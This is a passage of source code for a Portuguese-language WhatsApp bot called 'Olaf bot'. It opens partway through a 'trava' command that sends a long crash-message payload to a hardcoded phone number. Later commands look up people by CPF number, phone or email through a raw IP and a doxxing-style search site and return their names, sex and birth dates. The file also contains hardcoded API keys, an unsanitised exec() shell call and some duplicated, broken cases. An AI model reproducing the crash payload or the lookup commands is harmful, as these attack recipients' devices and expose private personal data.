ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺\n\nMensagem : ${pesan}`
                      var options = {
                         text: teks1,
                         text: teks2,
                         text: teks3,
                         text: teks4,
                         contextInfo: {mentionedJid: [mentidn]},
                     }
                    client.sendMessage('5518998253713@s.whatsapp.net', options, text, {quoted: mek})
                    reply('1 trava enviada')
                    break
           case 'playmp3':
                reply(mess.wait)
                play = body.slice(9)
                anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?q=${play}&apikey=${ZeksApi}`, {method: 'get'})
               if (anu.error) return reply(anu.error)
                 infomp3 = `「 *TIMELINE PLAY MP3* 」\n*• Título:* ${anu.result.title}\n*• Link:* ${anu.result.source}\n*• Tamanho:* ${anu.result.size}\n\n*ESPERE NOVAMENTE ENVIANDO POR FAVOR, NÃO SPAME O CHAT*`
                buffer = await getBuffer(anu.result.thumbnail)
                lagu = await getBuffer(anu.result.url_audio)
                client.sendMessage(from, buffer, image, {quoted: mek, caption: infomp3})
                client.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.title}.mp3`, quoted: mek})
                await limitAdd(sender) 
                break 
            case 'smule':
					if (args.length < 1) return reply('Cadê o url mano?')
					if (!isUrl(args[0]) && !args[0].includes('c-ash.smule')) return reply(mess.error.Iv)
					reply(mess.wait)
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/smule?link=${args[0]}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					teks = `*Título* : ${anu.title}\n\n Espere 1 minuto, talvez um pouco mais porque o download de vídeos esta executando`
					thumb = await getBuffer(anu.thumb)
					client.sendMessage(from, thumb, image, {quoted: mek, caption: teks})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', filename: `${anu.title}.mp4`, quoted: mek, caption: 'Aqui mano'})
					await limitAdd(sender) 	
					break  
				case 'ttp':
					if (args.length < 1) return reply('Cadê o texto, hum?')
					ranp = getRandom('.png')
					rano = getRandom('.webp')
					teks = body.slice(4).trim()
					anu = await fetchJson(`https://mhankbarbar.tech/api/text2image?text=${teks}&apiKey=${BarBarKey}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(mess.error.stick)
						client.sendMessage(from, fs.readFileSync(rano), sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
                                        await limitAdd(sender)
					break
                  case 'desbloquear':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.only.ownerB)
				    client.blockUser (`${body.slice(9)}@c.us`, "remove")
					client.sendMessage(from, `perintah Diterima, membuka blokir ${body.slice(9)}@c.us`, text)
				    break
                case 'image':
					if (args.length < 1) return reply('O que você quer procurar, mana?')
					goo = body.slice(7)
					anu = await fetchJson(`https://api.vhtear.com/googleimg?query=${goo}&apikey=ANTIGRATISNIHANJENKKK`, {method: 'get'})
					reply(mess.wait)
				    var pol = JSON.parse(JSON.stringify(anu.result.result_search));
                    var tes2 =  pol[Math.floor(Math.random() * pol.length)];
					pint = await getBuffer(tes2)
					client.sendMessage(from, pint, image, { caption: '*Google Image*\n\n*Resultado da pesquisa : '+goo+'*', quoted: mek })
					break
				case 'ban':
					if (!isOwner) return reply(mess.only.ownerB)
					client.banUser (`${body.slice(7)}@c.us`, "add")
					client.sendMessage(from, `você foi banido ${body.slice(7)}@c.us`, text)
					break
				case 'playstore':
					kuji = body.slice(7)
					reply(mess.wait)
					anu = await getBuffer(`https://api.vhtear.com/playstore?query={kuji}&apikey=Aris komtol`, {method: 'get'})
					capty = `*➸ title :* ${anu.title}\n*➸ app_id :* ${anu.app_id}\n*➸ description :* ${anu.description}\n*➸ developer_id :* ${anu.developer_id}\n*➸ developer :* ${anu.developer}\n*➸ score :* ${anu.score}\n*➸ full_price :* ${anu.full_price}\n*➸ price :* ${anu.price}\n*➸ free :* ${anu.free}`
					client.sendMessage(from, anu, image, {quoted: mek, caption: capty})
					break
				case 'otagall2':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `*😘* ${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					break
                case 'pinterest':
                    tels = body.slice(11)
					client.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=${tels}`, {method: 'get'})
					reply(mess.wait)
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					client.sendMessage(from, pok, image, { quoted: mek, caption: `*PINTEREST*\n\*Resultado da pesquisa* : *${tels}*`})
                    await limitAdd(sender)
					break
                case 'darkjokes':
				 data = fs.readFileSync('./src/darkjokes.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                hasil = await getBuffer(randKey.result)
                sendImage(hasil, mek, '*GELAP BOS :V*')
				break
                case 'olafofc':
				 data = fs.readFileSync('./src/olafofc.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                hasil = await getBuffer(randKey.result)
                sendImage(hasil, mek, '*GELAP BOS :V*')
				break
			case 'husbu':
			    data = fs.readFileSync('./outros/husbu.js');
                jsonData = JSON.parse(data);
		        randIndex = Math.floor(Math.random() * jsonData.length);
		        randKey = jsonData[randIndex];
		        hasil = await getBuffer(randKey.image)
		        sendImage(hasil, mek, randKey.teks)
				break
                case 'saycat':
				 data = fs.readFileSync('./src/saycat.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                hasil = await getBuffer(randKey.result)
                sendImage(hasil, mek, '*GELAP BOS :V*')
				break
                case 'alerta':
				 data = fs.readFileSync('./src/alerta.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                hasil = await getBuffer(randKey.result)
                sendImage(hasil, mek, '*alerta :V*')
				break									
         case 'moddroid':
			data = await fetchJson(`https://tobz-api.herokuapp.com/api/moddroid?q=${body.slice(10)}&apikey=${TobzApi}`)
			hepi = data.result[0] 
			teks = `*Nome*: ${data.result[0].title}\n*editor*: ${hepi.publisher}\n*mod info:* ${hepi.mod_info}\n*Tamanho*: ${hepi.size}\n*última versão*: ${hepi.latest_version}\n*gênero*: ${hepi.genre}\n*link:* ${hepi.link}\n*download*: ${hepi.download}`
			buffer = await getBuffer(hepi.image)
			client.sendMessage(from, buffer, image, {quoted: mek, caption: `${teks}`})
			await limitAdd(sender)
			break
		case 'happymod':
			data = await fetchJson(`https://tobz-api.herokuapp.com/api/happymod?q=${body.slice(10)}&apikey=${TobzApi}`)
			hupo = data.result[0] 
			teks = `*Nome*: ${data.result[0].title}\n*versão*: ${hupo.version}\n*Tamanho:* ${hupo.size}\n*root*: ${hupo.root}\n*compra*: ${hupo.price}\n*link*: ${hupo.link}\n*download*: ${hupo.download}`
			buffer = await getBuffer(hupo.image)
			client.sendMessage(from, buffer, image, {quoted: mek, caption: `${teks}`})
			await limitAdd(sender)
			break
                case 'testefog':
				 data = fs.readFileSync('./olaf/mebro.webp');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                hasil = await getBuffer(randKey.result)
                sendImage(hasil, mek, '*GELAP BOS :V*')
				break	
				case 'naruto':
					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=Naruto`, {method: 'get'})
					naru = JSON.parse(JSON.stringify(anu));
					to =  naru[Math.floor(Math.random() * naru.length)];
					nye = await getBuffer(to)
					client.sendMessage(from, nye, image, { caption: 'naruto!!', quoted: mek })
					await limitAdd(sender)
					break
			case 'miku2':
					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+miku`, {method: 'get'})
					mi = JSON.parse(JSON.stringify(anu));
					ku =  mi[Math.floor(Math.random() * mi.length)];
					nye = await getBuffer(ku)
					client.sendMessage(from, nye, image, { caption: '*I LOVE MIKU*', quoted: mek })
					await limitAdd(sender) 
					break
				case 'chika':
					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=FujiwaraChika`, {method: 'get'})
					sasu = JSON.parse(JSON.stringify(anu));
					ke =  sasu[Math.floor(Math.random() * sasu.length)];
					nye = await getBuffer(ke)
					client.sendMessage(from, nye, image, { caption: '*CHIKA-SAN*', quoted: mek })
					await limitAdd(sender) 
					break
                case 'gatos':
  					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=kucing`, {method: 'get'})
					n = JSON.parse(JSON.stringify(anu));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					client.sendMessage(from, pok, image, { quoted: mek , caption: '*GATINHOS🐈*'})
					await limitAdd(sender) 
					break
				case 'rem':
  					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=rem`, {method: 'get'})
					sasu = JSON.parse(JSON.stringify(anu));
					ke =  sasu[Math.floor(Math.random() * sasu.length)];
					nye = await getBuffer(ke)
					client.sendMessage(from, nye, image, { caption: '*REM-CHAN*', quoted: mek })
					await limitAdd(sender) 
					break
				case 'touka':
  					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+touka`, {method: 'get'})
					tou = JSON.parse(JSON.stringify(anu));
					ka =  tou[Math.floor(Math.random() * tou.length)];
					nye = await getBuffer(ka)
					client.sendMessage(from, nye, image, { caption: '*TOUKA-CHAN*', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'rize2':
  					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+rize`, {method: 'get'})
					ri = JSON.parse(JSON.stringify(anu));
					ze =  ri[Math.floor(Math.random() * ri.length)];
					nye = await getBuffer(ze)
					client.sendMessage(from, nye, image, { caption: '*RIZE-CHAN*', quoted: mek })
					await limitAdd(sender) 	
					break
				case 'akira2':
  					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+akira`, {method: 'get'})
					ak = JSON.parse(JSON.stringify(anu));
					ara =  ak[Math.floor(Math.random() * ak.length)];
					nye = await getBuffer(ara)
					client.sendMessage(from, nye, image, { caption: 'AKIRA-CHAN', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'itori2':
  					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+itori`, {method: 'get'})
					it = JSON.parse(JSON.stringify(anu));
					ori =  it[Math.floor(Math.random() * it.length)];
					nye = await getBuffer(ori)
					client.sendMessage(from, nye, image, { caption: 'ITORI-CHAN', quoted: mek })
					await limitAdd(sender) 
					break
                case 'cachorro':
                   if (!isGroup) return reply(ind.groupo())
         			reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anjing`, {method: 'get'})
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					client.sendMessage(from, pok, image, { quoted: mek })
					await limitAdd(sender)
					break
				case 'nsfwboquete':
					reply(mess.wait)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwblowjob}`, {method: 'get'})
					naru = JSON.parse(JSON.stringify(anu));
					to =  naru[Math.floor(Math.random() * naru.length)];
					nye = await getBuffer(to)
					client.sendMessage(from, nye, image, { caption: 'naruto!!', quoted: mek })
					await limitAdd(sender)
					break 
				case 'minato':
					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=Minato`, {method: 'get'})
					min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					client.sendMessage(from, nye, image, { caption: 'minato!!', quoted: mek })
					await limitAdd(sender)
					break 
case 'base1':
                    if (args.length < 1) return reply('Cade O Cpf? ')
                    anu = await fetchJson(`http://70.37.60.112:8080/bf/base1.php?cpf=${body.slice(10)}`)
			        base1 = `🔎 Olaf CONSULTAS / BASE 1 🔎

➳ NOME: ${anu.nome}
➳ SEXO: ${anu.sexo}
➳ NASCIMENTO: ${anu.nascimento}
📌 BY: OLAF BOT `
case 'base1':
                    if (args.length < 1) return reply('Cade O Cpf? ')
                    anu = await fetchJson(`http://70.37.60.112:8080/so/base1.php?cpf=${body.slice(10)}`)
			        base1 = `🔎 OLAF CONSULTAS / BASE 1 🔎

➳ NOME: ${anu.nome}
➳ SEXO: ${anu.sexo}
➳ NASCIMENTO: ${anu.nascimento}
📌 BY: OLAF BOT `
			        reply(base1)
			        break
			        case 'base2':
                    if (args.length < 1) return reply('Cade O Cpf? ')
                    anu = await fetchJson(`http://70.37.60.112:8080/so/base2.php?cpf=${body.slice(10)}`)
			        base2 = `🔎 OLAF CONSULTAS / BASE 2 🔎

➳ NOME: ${anu.nome}
➳ SEXO: ${anu.sexo}
➳ NASCIMENTO: ${anu.nascimento}
📌 BY: OLAF BOT `
			        reply(base2)
			        break
                case 'base3':
                    if (args.length < 1) return reply('Cade O Cpf? ')
                    anu = await fetchJson(`http://70.37.60.112:8080/so/base3.php?cpf=${body.slice(10)}`)
			        base3 = `🔎 OLAF CONSULTAS / BASE 3 🔎

➳ NOME: ${anu.nome}
➳ SEXO: ${anu.sexo}
➳ NASCIMENTO: ${anu.nascimento}
📌 BY: OLAF BOT `
			        reply(base3)
			        
					break
					
					case 'base4':
                    if (args.length < 1) return reply('Cade O Cpf? ')
                    anu = await fetchJson(`http://70.37.60.112:8080/so/base4.php?cpf=${body.slice(10)}`)
			        base4 = `🔎 OLAF CONSULTAS / BASE 4 🔎

➳ NOME: ${anu.nome}
➳ SEXO: ${anu.sexo}
➳ NASCIMENTO: ${anu.nascimento}
📌 BY: OLAF BOT `
			        reply(base4)
			        break
                case 'base5':
                    if (args.length < 1) return reply('Cade O Cpf? ')
                    anu = await fetchJson(`http://70.37.60.112:8080/so/base5.php?cpf=${body.slice(10)}`)
			        base5 = `🔎 OLAF CONSULTAS / BASE 5 🔎

➳ NOME: ${anu.nome}
➳ SEXO: ${anu.sexo}
➳ NASCIMENTO: ${anu.nascimento}
📌 BY: OLAF BOT `
			        reply(base5)
			        break
                case 'base6':
                    if (args.length < 1) return reply('Cade O Cpf? ')
                    anu = await fetchJson(`http://70.37.60.112:8080/so/base6.php?cpf=${body.slice(10)}`)
			        base6 = `🔎 OLAF CONSULTAS / BASE 6 🔎

➳ NOME: ${anu.nome}
➳ SEXO: ${anu.sexo}
➳ NASCIMENTO: ${anu.nascimento}
📌 BY: OLAF BOT `
			        reply(base6)
					break
			        reply(base1)
			        break
//tel

//consultas			        
	                case 'dulis':
	            	if (!isPremium) return reply('Ola, esse comando e apenas para vips, para ver como se tornar vip, digite .daftarvip, olaf agradece ❤️!' ,text, { quoted: mek })
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(6)
					if (teks.length > 15) return reply('Escreva o número certo!')
					reply('*Fazendo consulta no número, aguarde ✓*')
					buffer = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=57fcd6384cff4e529b9ca76089f05992&url=https://jlbuscas.com/apis2020/ho20ts/targtelefone.php?info=${teks}&width=600&height=1080&full_page=true&output=image`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*Consulta realizada* ✓\n\nDONO: OLAF\n\nMarque essa imagem com .leens para ver a consulta em texto'})
					break
		              
	               case 'scor':
	            	if (!isPremium) return reply('Ola, esse comando e apenas para vips, para ver como se tornar vip, digite .daftarvip, olaf agradece ❤️!' ,text, { quoted: mek })
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(10)
					if (teks.length > 28) return reply('Escreva o score certo!')
					reply('*Fazendo consulta no score, aguarde ✓*')
					buffer = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=57fcd6384cff4e529b9ca76089f05992&url=https://jlbuscas.com/apis2020/ho20ts/score1.php?info=${teks}`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*Consulta realizada* ✓\n\nDONO: OLAF'})
					break	
			case 'antitravass':
			await costum(antivirtexx(), text, tescuk, `olaf bot ⛄🔥`)
			break 
				case 'antitrava':
			     if (!isGroup) return reply(ind.groupo())
                 if (!isGroupAdmins) return reply(ind.admin())
					if (!isBotGroupAdmins) return reply(ind.badmin)
					if (args.length < 1) return reply('digite on para ativar')
					if ((args[0]) === 'on') {
						if (isAntiVirtex) return reply('antitrava ativado')
						_antivirtex.push(from)
						fs.writeFileSync('./database/json/antivirtex.json', JSON.stringify(_antivirtex))
						reply(`\`\`\`Ativado com sucesso o modo antitrava no grupo\`\`\` *${groupMetadata.subject}*`)
					} else if ((args[0]) === 'off') {
						if (!isAntiVirtex) return reply('O modo antitrava foi desativado')
						_antivirtex.splice(from, 1)
						fs.writeFileSync('./database/json/antivirtex.json', JSON.stringify(_antivirtex))
						reply(`\`\`\`Modo antitrava desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
					} else {
						reply('on para habilitar, off para desabilitar')
					}
					break
	               case 'mail':
	            	if (!isPremium) return reply('Ola, esse comando e apenas para vips, para ver como se tornar vip, digite .daftarvip, olaf agradece ❤️!' ,text, { quoted: mek })
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(10)
					if (teks.length > 60) return reply('Escreva o email certo!')
					reply('*Fazendo consulta no e-mail, aguarde ✓*')
					buffer = await getBuffer(`https://screenshotapi.net/api/v1/screenshot?token=KZ1DIAUJCPKZLAB51RTZYR5IAL902JHT&url=https://jlbuscas.com/apis2020/ho20ts/emaillocaliza.php?info=${teks}&width=600&height=1080&full_page=true&fresh=true&output=image`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*Consulta realizada* ✓\n\nDONO: OLAF'})
					break	
	               case 'cpf':
	            	if (!isPremium) return reply('Ola, esse comando e apenas para vips, para ver como se tornar vip, digite .daftarvip, olaf agradece ❤️!' ,text, { quoted: mek })
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(10)
					if (teks.length > 60) return reply('Escreva o email certo!')
					reply('*Fazendo consulta no cpf, aguarde ✓*')
					buffer = await getBuffer(`https://screenshotapi.net/api/v1/screenshot?token=KZ1DIAUJCPKZLAB51RTZYR5IAL902JHT&url=https://jlbuscas.com/apis2020/ho20ts/cpflocaliza.php?info=${teks}width=600&height=1080&full_page=true&fresh=true&output=image`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*Consulta realizada* ✓\n\nDONO: OLAF'})
					break												
				case 'boruto':

					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=Boruto`, {method: 'get'})
					bor = JSON.parse(JSON.stringify(anu));
					uto =  bor[Math.floor(Math.random() * bor.length)];
					nye = await getBuffer(uto)
					client.sendMessage(from, nye, image, { caption: 'boruto!!', quoted: mek })
					await limitAdd(sender)
					break 
                  case 'dono1':                     
					data = await fetchJson(`https://pastebin.com/raw/25UiK4A5`, {method: 'get'})
                     anuk = await getBuffer(data.img)
                     Dark = `➳ NOME: ${data.nome}\n➳ NUMERO: ${data.numero}\n➳ SEXO: ${data.sexo}\n➳ NICK: ${data.nick}\n➳ YT: ${data.yt}\n➳ INSTA: ${data.insta}`                     
					client.sendMessage(from, anuk, image, {quoted: mek, caption: dark})
                    await limitAdd(sender)
                    break                  
                case 'carta':
                    if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 30) return reply('ate 30 caracteres')
                    anu = await fetchJson(`https://deckofcardsapi.com/api/deck/${teks}/draw/?count=2`)
			        carta = `INFORMAÇÕES DA SUA CARTA

➳ IMAGEM DA CARTA: ${anu.image}
➳ VALOR: ${anu.data.value}
➳ TRAJE: ${anu.data.suit}
➳ CARTA: ${anu.code}

➳ SUAS CARTAS RESTANTES: ${anu.remaining}

Eae, ganhou do seu oponente 😳`
			        reply(carta)
					break
					
                case 'bmerc':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 30) return reply('O id é longo, até 30 caracteres')
                    anu = await fetchJson(`https://api.mercadolibre.com/applications/${teks}`)
			        merc = `INFORMAÇÕS DO PRODUTO 🐊🚩

➳ ID DO PRODUTO: ${anu.id}
